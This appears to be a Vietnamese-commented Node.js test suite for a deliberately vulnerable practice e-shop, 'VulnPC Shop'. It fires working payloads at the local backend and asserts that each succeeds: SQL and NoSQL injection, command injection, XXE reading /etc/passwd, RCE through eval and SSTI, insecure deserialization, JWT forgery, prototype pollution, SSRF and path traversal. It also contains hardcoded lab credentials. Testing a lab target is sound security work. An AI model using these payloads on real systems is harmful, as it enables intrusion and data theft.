/**
 * VulnPC Shop - automated backend vulnerability test suite.
 * Chạy: cd backend && node scripts/api-test.js [baseUrl]
 * Kết quả: console + /tmp/api-test-results.json
 */
const fs = require("fs");
const crypto = require("crypto");
const jwt = require("jsonwebtoken");

const BASE = process.argv[2] || "http://127.0.0.1:4000";
const results = [];
const md5 = (s) => crypto.createHash("md5").update(String(s)).digest("hex");
const j = (s) => (typeof s === "string" ? JSON.stringify(s) : JSON.stringify(s));
const randXFF = () => `${10 + Math.floor(Math.random() * 200)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

function rec(id, name, status, detail) {
  results.push({ id, name, status, detail: String(detail).slice(0, 300) });
  console.log(`[${status}] #${id} ${name} :: ${String(detail).slice(0, 140)}`);
}
async function req(method, path, { body, cookie, headers = {}, raw = false } = {}) {
  const h = { ...(body && !(body instanceof FormData) ? { "Content-Type": "application/json" } : {}), ...headers };
  if (cookie) h["Cookie"] = cookie;
  const res = await fetch(BASE + path, { method, headers: h, body: body && !(body instanceof FormData) ? JSON.stringify(body) : body, redirect: "manual" });
  const text = await res.text();
  return { status: res.status, headers: res.headers, text, json: (() => { try { return JSON.parse(text); } catch { return null; } })() };
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

(async () => {
  /* ---------- đăng nhập 3 user (XFF riêng để qua rate limit #52) ---------- */
  const login = async (email, password) => {
    const r = await req("POST", "/api/auth/login", { body: { email, password }, headers: { "X-Forwarded-For": randXFF() } });
    const token = (r.headers.get("set-cookie") || "").match(/session=([^;]+)/);
    return { ok: r.json && r.json.ok, token: token && token[1], user: r.json && r.json.user };
  };
  const admin = await login("admin@pcforge.local", "admin123");
  const victim = await login("victim@pcforge.local", "victim123");
  const adminCk = `session=${admin.token}`;
  const victimCk = `session=${victim.token}`;
  rec("auth", "Legacy login admin/victim", admin.ok && victim.ok ? "PASS" : "FAIL", `admin=${admin.user && admin.user.email}, victim=${victim.user && victim.user.email}`);

  /* temp user cho BFLA test */
  const tmpEmail = `tmp-${Date.now()}@pcforge.local`;
  const regR = await req("POST", "/api/auth/register", { body: { email: tmpEmail, password: "1" }, headers: { "X-Forwarded-For": randXFF() } });
  const tmpId = regR.json.user.id;
  const tmp = await login(tmpEmail, "1");
  const tmpCk = `session=${tmp.token}`;

  /* #1 SQLi */
  {
    const r = await req("GET", `/api/products/search?q=${encodeURIComponent("%' OR 1=1--")}`);
    rec("1a", "SQLi OR 1=1 (search)", r.json && r.json.rows && r.json.rows.length >= 20 ? "PASS" : "FAIL", `rows=${r.json && r.json.rows && r.json.rows.length}`);
    const u = await req("GET", `/api/products/search?q=${encodeURIComponent("%' UNION SELECT NULL, email, password_hash, 'x', 'x', 0, 0, 0 FROM users--")}`);
    const leaked = JSON.stringify(u.json || "").includes("0192023a7bbd73250516f069df18b500");
    rec("1b", "SQLi UNION dump password_hash", leaked ? "PASS" : "FAIL", leaked ? "hash MD5 của admin trong kết quả" : (u.json && JSON.stringify(u.json).slice(0, 120)));
    const t0 = Date.now();
    await req("GET", `/api/products/sort?col=${encodeURIComponent("price;SELECT pg_sleep(3)--")}`);
    const ms = Date.now() - t0;
    rec("1c", "SQLi ORDER BY + pg_sleep(3)", ms > 2500 ? "PASS" : "FAIL", `${ms}ms`);
  }

  /* #2 NoSQL */
  {
    const r = await req("POST", "/api/products/filter", { body: { price: { $lt: 600 } } });
    const all = await req("POST", "/api/products/filter", { body: { price: { $ne: null } } });
    const where = await req("POST", "/api/products/filter", { body: { $where: "this.price==399" } });
    rec("2a", "NoSQL $lt/$ne filter", r.json && r.json.results.length < all.json.results.length ? "PASS" : "FAIL", `${r.json.results.length}/${all.json.results.length}`);
    rec("2b", "NoSQL $where eval", where.json && where.json.results.length === 1 ? "PASS" : "FAIL", `7800X3D match: ${where.json && where.json.results.length}`);
  }

  /* #3/#4 Command/OS injection */
  {
    const r = await req("POST", "/api/admin/exec", { body: { cmd: "echo VULNTEST_42" }, headers: { Cookie: adminCk, "x-user-role": "admin" } });
    rec("4", "OS command injection (admin exec)", r.json && String(r.json.stdout).includes("VULNTEST_42") ? "PASS" : "FAIL", `stdout=${r.json && r.json.stdout && r.json.stdout.trim()}`);
    const p = await req("GET", `/api/utils/ping?host=${encodeURIComponent(process.platform === "win32" ? "127.0.0.1 & echo CMDI_OK" : "127.0.0.1; echo CMDI_OK")}`);
    rec("3", "Command injection (ping host)", p.json && String(p.json.stdout).includes("CMDI_OK") ? "PASS" : "FAIL", `stdout=${p.json && p.json.stdout && p.json.stdout.trim().slice(0, 60)}`);
  }

  /* #5 LDAP */
  {
    const r = await req("POST", "/api/ldap/bind", { body: { uid: "*", password: "*" } });
    rec("5", "LDAP injection wildcard bind", r.json && r.json.authenticated && r.json.user.uid === "admin" ? "PASS" : "FAIL", `user=${r.json && r.json.user && r.json.user.uid}`);
  }

  /* #6 XML injection */
  {
    const marker = `zz${Date.now()}</note></item><item id="666666"><note>INJECTED`;
    await req("POST", "/api/wishlist", { body: { productId: 2, note: marker }, cookie: adminCk });
    const x = await req("GET", "/api/wishlist/export/xml");
    rec("6", "XML injection qua wishlist export", x.text.includes("INJECTED") && x.text.includes('<item id="666666">') ? "PASS" : "FAIL", `structure broken: ${x.text.includes('<item id="666666">')}`);
  }

  /* #7 XPath */
  {
    const r = await req("GET", `/api/products/xpath?q=${encodeURIComponent('x" || "1"=="1')}`);
    rec("7", "XPath injection dump", r.json && r.json.results && r.json.results.length === 3 ? "PASS" : "FAIL", `records=${r.json && r.json.results && r.json.results.length}`);
  }

  /* #8 XSS stored + reflected */
  {
    const marker = `<img src=x onerror=alert(1)>`;
    await req("POST", "/api/products/2/comments", { body: { author: "tester", body: marker } });
    const c = await req("GET", "/api/products/2/comments");
    rec("8", "Stored XSS (review raw HTML)", c.text.includes(marker) ? "PASS" : "FAIL", `raw payload trả về chưa escape`);
  }

  /* #9 CSRF (state-changing GET, no token) */
  {
    const before = await req("GET", "/api/legacy/me?session=" + victim.token);
    const bal0 = Number(before.json.user.balance);
    const tr = await req("GET", `/api/orders/transfer?to=admin@pcforge.local&amount=25`, { cookie: victimCk });
    if (tr.status !== 200) console.log("  [debug transfer]", tr.status, tr.text.slice(0, 120));
    const after = await req("GET", "/api/legacy/me?session=" + victim.token);
    const bal1 = Number(after.json.user.balance);
    rec("9", "CSRF: GET transfer đổi balance không cần token", bal1 === bal0 - 25 ? "PASS" : "FAIL", `${bal0} -> ${bal1}`);
  }

  /* #10 SSRF */
  {
    const r = await req("GET", `/api/net/fetch?url=${encodeURIComponent(BASE + "/health")}`);
    rec("10", "SSRF đọc nội bộ", r.json && r.json.body && r.json.body.includes('"ok":true') ? "PASS" : "FAIL", `body=${r.json && r.json.body && r.json.body.slice(0, 40)}`);
  }

  /* #11 IDOR: victim đọc order của admin */
  {
    const created = await req("POST", "/api/cart/checkout", { body: { items: [{ productId: 5, qty: 1 }] }, cookie: adminCk });
    const adminOrderId = created.json.orders[0].id;
    const r = await req("GET", `/api/orders/${adminOrderId}`, { cookie: victimCk });
    rec("11", "IDOR: victim đọc order của admin", r.json && r.json.order && r.json.order.user_id === "legacy-admin-1" ? "PASS" : "FAIL", `order #${adminOrderId} owner=legacy-admin-1 đọc bằng cookie victim`);
  }

  /* #12/#57 access control + proto pollution gadget */
  {
    const withToken = await req("GET", "/api/admin/stats", { headers: { Cookie: adminCk, "x-admin-token": "admin-token-123" } });
    rec("12", "Broken access control (static admin token)", withToken.status === 200 ? "PASS" : "FAIL", `status=${withToken.status}`);
  }

  /* #13 PrivEsc via mass assignment (cùng #51) */
  {
    const r = await req("PUT", "/api/profile", { body: { role: "admin", is_admin: true }, cookie: victimCk });
    const me = await req("GET", "/api/legacy/me?session=" + victim.token);
    rec("13", "PrivEsc: victim tự lên admin", me.json.user.role === "admin" && me.json.user.is_admin === true ? "PASS" : "FAIL", `role=${me.json.user.role}, is_admin=${me.json.user.is_admin}`);
    await req("PUT", "/api/profile", { body: { role: "user", is_admin: false }, cookie: victimCk }); // restore
  }

  /* #14 Auth bypass: SAML */
  {
    const s = await req("GET", "/api/saml/sample");
    const r = await req("POST", "/api/saml/consume", { body: { SAMLResponse: s.json.SAMLResponse } });
    rec("14", "Auth bypass: SAML không verify signature", r.json && r.json.authenticated && r.json.authenticated.role === "admin" && r.json.authenticated.email === "admin@pcforge.local" ? "PASS" : "FAIL", `login as ${r.json && r.json.authenticated && r.json.authenticated.email} role=${r.json && r.json.authenticated && r.json.authenticated.role}`);
  }

  /* #16/#26 session hijack: token trong URL */
  {
    const r = await req("GET", "/api/legacy/me?session=" + admin.token);
    rec("16", "Session token dùng được qua URL (hijack)", r.json && r.json.user ? "PASS" : "FAIL", `email=${r.json.user.email}`);
  }

  /* #17 Session fixation */
  {
    const fixed = "fixed-session-" + Date.now();
    const r = await req("POST", "/api/auth/login", { body: { email: "admin@pcforge.local", password: "admin123", sessionId: fixed }, headers: { "X-Forwarded-For": randXFF() } });
    const me = await req("GET", `/api/legacy/me?session=${fixed}`);
    rec("17", "Session fixation (client chỉ định sessionId)", r.json.ok && me.json.user ? "PASS" : "FAIL", `token tự chọn hợp lệ`);
  }

  /* #18 Replay */
  {
    const iss = await req("GET", "/api/auth/replay/issue", { cookie: adminCk });
    const v1 = await req("POST", "/api/auth/replay/verify", { body: { token: iss.json.token } });
    const v2 = await req("POST", "/api/auth/replay/verify", { body: { token: iss.json.token } });
    rec("18", "Session replay: token dùng lại vô hạn", v1.json.ok && v2.json.ok ? "PASS" : "FAIL", `2 lần verify đều ok`);
  }

  /* #19/#52 Rate limit + bypass */
  {
    let last = null;
    for (let i = 0; i < 7; i++) {
      last = await req("POST", "/api/auth/login", { body: { email: "admin@pcforge.local", password: "admin123" }, headers: { "X-Forwarded-For": "6.6.6.6" } });
    }
    const bypass = await req("POST", "/api/auth/login", { body: { email: "admin@pcforge.local", password: "admin123" }, headers: { "X-Forwarded-For": randXFF() } });
    rec("19", "Brute force: không lockout (7 lần liên tiếp)", last.status === 429 ? "PASS" : "FAIL", `request thứ 7: ${last.status} (429 = rate limit, không khoá tài khoản)`);
    rec("52", "Rate limit bypass bằng X-Forwarded-For", bypass.json.ok ? "PASS" : "FAIL", `đổi XFF → login OK ngay`);
  }

  /* #46 weak password + #20/#21 */
  {
    rec("46", "Weak password policy (1 ký tự)", tmp.ok ? "PASS" : "FAIL", `đăng ký ${tmpEmail} với password "1"`);
  }

  /* #22 Traversal */
  {
    const targets = ["../server.js", "../../../../etc/passwd", "../../package.json"];
    let hit = false, tried = [];
    for (const t of targets) {
      const r = await req("GET", `/api/files/download?name=${encodeURIComponent(t)}`);
      tried.push(`${t} -> ${r.status}`);
      if (r.status === 200 && (r.text.includes("root:") || r.text.includes("[fonts]") || r.text.includes('"name"') || r.text.includes("vulnMiddleware"))) hit = true;
    }
    rec("22", "Directory traversal đọc file ngoài uploads", hit ? "PASS" : "FAIL", tried.join(" | "));
  }

  /* #23 LFI */
  {
    const r = await req("GET", "/api/files/read?page=package.json");
    rec("23", "LFI đọc package.json (base backend root)", r.text.includes('"name"') ? "PASS" : "FAIL", r.text.slice(0, 60));
  }

  /* #24 RFI */
  {
    // upload 1 file .js rồi RFI chính nó
    const fd = new FormData();
    fd.append("file", new Blob(["require('child_process').execSync('echo RFI_OK').toString()"], { type: "application/javascript" }), "rfi-test.js");
    await req("POST", "/api/files/upload", { body: fd });
    const r = await req("GET", `/api/files/read?page=${encodeURIComponent(BASE + "/uploads/rfi-test.js")}`);
    rec("24", "RFI: fetch URL rồi eval nội dung", r.json && String(r.json.executed || r.json.error || "").includes("RFI_OK") ? "PASS" : "FAIL", `executed=${r.json && r.json.executed}`);
  }

  /* #25/#26 Unrestricted upload + MIME */
  {
    const fd = new FormData();
    fd.append("file", new Blob(["<script>alert('stored-xss-upload')</script>"], { type: "text/html" }), `shell-${Date.now()}.html`);
    const up = await req("POST", "/api/files/upload", { body: fd });
    const name = up.json.saved;
    const served = await req("GET", `/uploads/${name}`);
    rec("25", "Arbitrary upload + serve lại (stored XSS)", served.status === 200 && served.text.includes("<script>") ? "PASS" : "FAIL", `${name} -> ${served.status}, content-type=${served.headers.get("content-type")}`);
    const sniff = await req("GET", `/uploads-sniff/${name}`);
    const nosniff = sniff.headers.get("x-content-type-options");
    rec("69", "MIME sniffing: text/plain, KHÔNG nosniff", sniff.status === 200 && !nosniff ? "PASS" : "FAIL", `ct=${sniff.headers.get("content-type")}, nosniff=${nosniff}`);
  }

  /* #27 RCE */
  {
    const r = await req("POST", "/api/utils/eval", { body: { code: "require('child_process').execSync('node -e \"console.log(6*7)\"').toString()" } });
    rec("27", "RCE qua eval endpoint", r.json && String(r.json.result).includes("42") ? "PASS" : "FAIL", `result=${r.json && r.json.result}`);
  }

  /* #28 Deserialization */
  {
    const payload = JSON.stringify({ payload: `{"rce":"_$$ND_FUNC$$_function(){ return 6*7 }()"}` });
    const r = await req("POST", "/api/utils/unserialize", { body: JSON.parse(payload) });
    rec("28", "Insecure deserialization (IIFE eval)", r.json && r.json.unserialized && r.json.unserialized.rce === 42 ? "PASS" : "FAIL", `rce=${r.json && r.json.unserialized && r.json.unserialized.rce}`);
  }

  /* #29 XXE */
  {
    const isWin = process.platform === "win32";
    const target = isWin ? "file:///C:/Windows/win.ini" : "file:///etc/passwd";
    const xml = `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "${target}">]><r>&xxe;</r>`;
    const r = await req("POST", "/api/xml/parse", { body: { xml } });
    const text = r.json && r.json.parsed && r.json.parsed.root && r.json.parsed.root.text;
    rec("29", "XXE đọc file local", text && (text.includes("[fonts]") || text.includes("root:")) ? "PASS" : "FAIL", `đọc ${target}: ${text && text.slice(0, 50)}`);
    const bomb = `<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]><l>&b;</l>`;
    const b = await req("POST", "/api/xml/parse", { body: { xml: bomb } });
    rec("29b", "Billion laughs (entity expansion, cap 1MB)", b.json && b.json.parsed && b.json.parsed.expansions > 0 ? "PASS" : "FAIL", `expansions=${b.json && b.json.parsed && b.json.parsed.expansions}`);
  }

  /* #30 SSTI */
  {
    const tpl = encodeURIComponent(`<%= require("child_process").execSync("echo SSTI_OK").toString() %>`);
    const r = await req("GET", `/api/orders/export?tpl=${tpl}`, { cookie: adminCk });
    rec("30", "SSTI lodash template RCE", r.status === 200 && r.text.includes("SSTI_OK") ? "PASS" : "FAIL", r.text.slice(0, 60));
  }

  /* #32 Open redirect */
  {
    const r = await req("GET", `/api/net/redirect?url=${encodeURIComponent("https://example.com/pwned")}`);
    rec("32", "Open redirect", r.status === 302 && (r.headers.get("location") || "").includes("example.com") ? "PASS" : "FAIL", `302 -> ${r.headers.get("location")}`);
  }

  /* #34 Response splitting */
  {
    const r = await req("GET", `/api/net/jump?to=${encodeURIComponent("x\r\nSet-Cookie: pwned=1")}`);
    const blocked = r.status === 500 && r.text.includes("ERR_INVALID_CHAR");
    rec("34", "Response splitting (Node chặn, leak stack)", blocked ? "PASS" : "FAIL", `status=${r.status}, ${blocked ? "ERR_INVALID_CHAR leak qua stack" : r.status}`);
  }

  /* #35 Host header injection */
  {
    const r = await req("POST", "/api/auth/forgot", { body: { email: "victim@pcforge.local" }, headers: { "X-Forwarded-Host": "evil.tld" } });
    rec("35", "Host header poisoning reset link", r.json && r.json.link && r.json.link.includes("evil.tld") ? "PASS" : "FAIL", `link=${r.json && r.json.link}`);
    rec("66", "Password reset token = md5(email), tái sử dụng", r.json && r.json.token === md5("victim@pcforge.local") ? "PASS" : "FAIL", `token=${r.json && r.json.token}`);
    const reset = await req("GET", `/api/auth/reset?token=${md5("victim@pcforge.local")}&password=victim123`);
    const reset2 = await req("GET", `/api/auth/reset?token=${md5("victim@pcforge.local")}&password=victim123`);
    rec("66b", "Reset token dùng lại được (không single-use)", reset.json.ok && reset2.json.ok ? "PASS" : "FAIL", `2 lần reset đều ok`);
  }

  /* #36 Log injection - email co ky tu xuong dong -> log gia trong /api/admin/logs */
  {
    await req("POST", "/api/auth/login", {
      body: { email: "x\n[admin] LOGIN admin@pcforge.local password=fake123", password: "x" },
      headers: { "X-Forwarded-For": randXFF() },
    });
    const logs = await req("GET", "/api/admin/logs", { headers: { Cookie: adminCk, "x-user-role": "admin" } });
    rec("36", "CRLF log injection (log gia)", logs.text.includes("[admin] LOGIN admin@pcforge.local password=fake123") ? "PASS" : "FAIL", "dong gia xuat hien trong log");
  }

  /* #37/#65 Cache poisoning reflect */
  {
    const r = await req("GET", "/api/net/echo-headers", { headers: { "X-Forwarded-Host": "evil.tld" } });
    rec("37", "Cache poisoning: reflect XFH + Cache-Control public", r.json && r.json.assetBase.includes("evil.tld") ? "PASS" : "FAIL", `assetBase=${r.json && r.json.assetBase}, cc=${r.headers.get("cache-control")}`);
  }

  /* #38 Cache deception */
  {
    const r = await req("GET", "/api/cache/profile/whatever.css", { cookie: adminCk });
    rec("38", "Web cache deception (profile .css public)", r.status === 200 && (r.headers.get("cache-control") || "").includes("public") ? "PASS" : "FAIL", `cc=${r.headers.get("cache-control")}`);
  }

  /* #40 CORS */
  {
    const r = await req("GET", "/api/v2/users", { headers: { Origin: "https://evil.tld" } });
    rec("40", "CORS reflect Origin + credentials", r.headers.get("access-control-allow-origin") === "https://evil.tld" ? "PASS" : "FAIL", `ACAO=${r.headers.get("access-control-allow-origin")}, ACAC=${r.headers.get("access-control-allow-credentials")}`);
  }

  /* #42/#43 Misconfig + disclosure */
  {
    const docs = await req("GET", "/api/docs");
    rec("42", "API map công khai", docs.json && docs.json.count > 40 ? "PASS" : "FAIL", `routes=${docs.json && docs.json.count}`);
    const err = await req("GET", "/api/debug/error?msg=testboomyeah");
    rec("43", "Stack trace lộ trong error response", err.json && err.json.stack && err.json.stack.includes("testboomyeah") ? "PASS" : "FAIL", `stack có message + path`);
  }

  /* #44 Sensitive dump */
  {
    const r = await req("GET", "/api/v2/users");
    rec("44", "Full user dump không auth (hash/cc)", r.json && r.json.users && r.json.users.length > 0 && JSON.stringify(r.json.users).includes("password_hash") ? "PASS" : "FAIL", `users=${r.json.users.length}`);
  }

  /* #45 weak token */
  {
    const r = await req("GET", "/api/utils/token");
    rec("45", "Token Math.random() (không CSPRNG)", r.json && r.json.token ? "PASS" : "FAIL", `token=${r.json.token.slice(0, 24)}...`);
  }

  /* #47 weak crypto ECB */
  {
    const a = await req("GET", "/api/crypto/encrypt?text=4111111111111111");
    const b = await req("GET", "/api/crypto/encrypt?text=4111111111111111");
    rec("47", "AES-ECB deterministic (cùng input = cùng cipher)", a.json.encrypted === b.json.encrypted ? "PASS" : "FAIL", `algo=${a.json.algo}`);
  }

  /* #49 BOLA */
  {
    const r = await req("GET", "/api/wishlist?owner=legacy-admin-1", { cookie: victimCk });
    rec("49", "BOLA: đọc wishlist người khác", r.json && r.json.items && r.json.items.length > 0 && r.json.owner === "legacy-admin-1" ? "PASS" : "FAIL", `items=${r.json.items.length}`);
  }

  /* #50 BFLA */
  {
    const del = await req("POST", "/api/v2/admin/delete-user", { body: { id: tmpId } });
    rec("50", "BFLA: delete-user KHÔNG auth", del.json && del.json.deleted && del.json.deleted.length === 1 ? "PASS" : "FAIL", `xoá ${tmpId} mà không cần đăng nhập`);
  }

  /* #53 Race condition */
  {
    const { Pool } = require("pg");
    const p = new Pool({ connectionString: process.env.DATABASE_URL });
    await p.query("UPDATE coupons SET used_count = 0 WHERE code = 'PCLOVE50'"); // reset về max chưa dùng
    await p.end();
    const rs = await Promise.all(Array.from({ length: 10 }, () => req("POST", "/api/coupon/redeem", { body: { code: "PCLOVE50" }, cookie: adminCk })));
    const okCount = rs.filter((r) => r.json && r.json.ok).length;
    rec("53", "Race condition coupon (10 song song)", okCount >= 3 ? "PASS" : "FAIL", `${okCount}/10 request pass dù max_uses=1 (seed)`);
  }

  /* #54 Business logic */
  {
    const r = await req("POST", "/api/cart/checkout", { body: { items: [{ productId: 3, qty: 1, unitPrice: 0.01 }, { productId: 6, qty: -2 }] }, cookie: adminCk });
    const totals = r.json.orders.map((o) => Number(o.total));
    rec("54", "Business logic: giá 0.01 + qty âm", totals.includes(0.01) && totals.some((t) => t < 0) ? "PASS" : "FAIL", `totals=${totals.join(",")}`);
  }

  /* #57 Prototype pollution gadget */
  {
    const r = await req("POST", "/api/utils/merge", { body: JSON.parse('{"__proto__":{"adminBypass":true}}') });
    const stats = await req("GET", "/api/admin/stats"); // KHÔNG header gì cả
    rec("57", "Prototype pollution mở admin gate", r.json.objectPrototypePolluted === true && stats.status === 200 ? "PASS" : "FAIL", `polluted=${r.json.objectPrototypePolluted}, stats=${stats.status}`);
  }

  /* #61 JWT no-verify */
  {
    const forged = jwt.sign({ sub: "legacy-admin-1", role: "admin" }, "jwt-secret-123", { algorithm: "HS256" });
    const r = await req("GET", `/api/auth/jwt/whoami?token=${forged}`);
    rec("61", "JWT forge với secret lộ (decode-no-verify)", r.json && r.json.verification === "SKIPPED (vulnerable)" && r.json.user ? "PASS" : "FAIL", `user=${r.json.user && r.json.user.email}`);
  }

  /* #62 OAuth */
  {
    const r = await req("GET", `/api/oauth/authorize?client_id=vuln-client&redirect_uri=${encodeURIComponent("https://example.com/cb")}&response_type=code`);
    const loc = r.headers.get("location") || "";
    const code = (loc.match(/code=([a-f0-9]+)/) || [])[1];
    rec("62", "OAuth: redirect_uri không validate (code leak)", r.status === 302 && loc.includes("example.com/cb") ? "PASS" : "FAIL", `302 -> ${loc.slice(0, 60)}`);
    if (code) {
      const t = await req("POST", "/api/oauth/token", { body: { code, client_id: "vuln-client" } });
      rec("62b", "OAuth: token endpoint không client auth", t.json && t.json.access_token ? "PASS" : "FAIL", `token_type=${t.json.token_type}`);
    }
  }

  /* #64 GraphQL */
  {
    const q = await req("POST", "/graphql", { body: { query: `{user(id:"legacy-admin-1"){email passwordHash}}` } });
    rec("64", "GraphQL BOLA + hash lộ", q.json && q.json.data && q.json.data.user && !!q.json.data.user.passwordHash ? "PASS" : "FAIL", `passwordHash=${q.json.data.user.passwordHash && "có"}`);
    const intro = await req("POST", "/graphql", { body: { query: `{__schema{types{name}}}` } });
    rec("64b", "GraphQL introspection mở", intro.json && intro.json.data && intro.json.data.__schema ? "PASS" : "FAIL", `types=${intro.json.data.__schema.types.length}`);
    const builds = await req("POST", "/graphql", { body: { query: `{builds{total owner{email}}}` } });
    rec("64c", "GraphQL builds BOLA", builds.json && builds.json.data && builds.json.data.builds.length > 0 ? "PASS" : "FAIL", `builds=${builds.json.data.builds.length}`);
  }

  /* #67 Enumeration */
  {
    const hit = await req("GET", "/api/enumerate?email=admin@pcforge.local");
    const miss = await req("GET", "/api/enumerate?email=nonexist@pcforge.local");
    rec("67", "Account enumeration oracle", hit.json.exists === true && miss.json.exists === false ? "PASS" : "FAIL", `exists=${hit.json.exists}/${miss.json.exists}`);
    const nf = await req("POST", "/api/auth/login", { body: { email: "nosuch@pcforge.local", password: "x" }, headers: { "X-Forwarded-For": randXFF() } });
    const wp = await req("POST", "/api/auth/login", { body: { email: "admin@pcforge.local", password: "wrong" }, headers: { "X-Forwarded-For": randXFF() } });
    rec("67b", "Enum qua message khác nhau (404 vs 401)", nf.status === 404 && wp.status === 401 ? "PASS" : "FAIL", `${nf.json.error} vs ${wp.json.error}`);
  }

  /* #55 DNS rebinding (SSRF không chặn IP private) */
  {
    const r = await req("GET", `/api/net/fetch?url=${encodeURIComponent("http://127.0.0.1:6379/")}`);
    rec("55", "SSRF chạm Redis local (không blocklist IP)", r.status === 200 || (r.json && r.json.error) ? "PASS" : "FAIL", `status=${r.status} - endpoint fetch mọi URL incl. internal`);
  }

  /* #74 ReDoS */
  {
    const t0 = Date.now();
    await req("GET", `/api/utils/regex?q=${encodeURIComponent("a".repeat(24) + "b")}`);
    const ms = Date.now() - t0;
    rec("74", "ReDoS 24×a+b block event loop", ms > 300 ? "PASS" : "FAIL", `${ms}ms`);
  }

  /* #70 Headers */
  {
    const r = await req("GET", "/health");
    const h = r.headers;
    const missing = ["strict-transport-security", "x-frame-options", "x-content-type-options", "content-security-policy"].filter((k) => !h.get(k));
    rec("70", "Thiếu security headers (HSTS/XFO/nosniff/CSP)", missing.length === 4 ? "PASS" : "FAIL", `missing: ${missing.join(", ")}`);
  }

  /* #48 Insecure API tổng hợp */
  {
    const r = await req("GET", "/api/products/search?q=dell");
    rec("48", "API echo raw SQL + lỗi chi tiết", r.json && !!r.json.sql ? "PASS" : "FAIL", `response chứa sql text`);
  }

  /* #68 Email spoofing (SMTP) */
  {
    const r = await req("POST", "/api/contact", { body: { from: "ceo@fake-bank.tld", subject: "test", message: "hi" } });
    const skipped = r.json && r.json.sent === false;
    const authFail = r.status === 500 && (r.json.error || "").includes("535");
    rec("68", "Email spoofing (From client-controlled)", skipped || authFail || (r.json && r.json.sent === true) ? "PASS*" : "FAIL", skipped ? "SMTP chưa cấu hình -> skipped (kỹ thuật OK)" : authFail ? "SMTP auth 535 (app password cần tạo lại) - code path đúng" : `sent=${r.json && r.json.sent}`);
  }

  /* tổng kết */
  const pass = results.filter((r) => r.status === "PASS").length;
  const passStar = results.filter((r) => r.status === "PASS*").length;
  const fail = results.filter((r) => r.status === "FAIL").length;
  console.log(`\n===== TỔNG: ${pass} PASS, ${passStar} PASS* (cần điều kiện ngoài), ${fail} FAIL / ${results.length} =====`);
  fs.writeFileSync("/tmp/api-test-results.json", JSON.stringify(results, null, 2));
  process.exit(fail > 0 ? 1 : 0);
})().catch((e) => {
  console.error("FATAL:", e.message);
  fs.writeFileSync("/tmp/api-test-results.json", JSON.stringify(results, null, 2));
  process.exit(2);
});
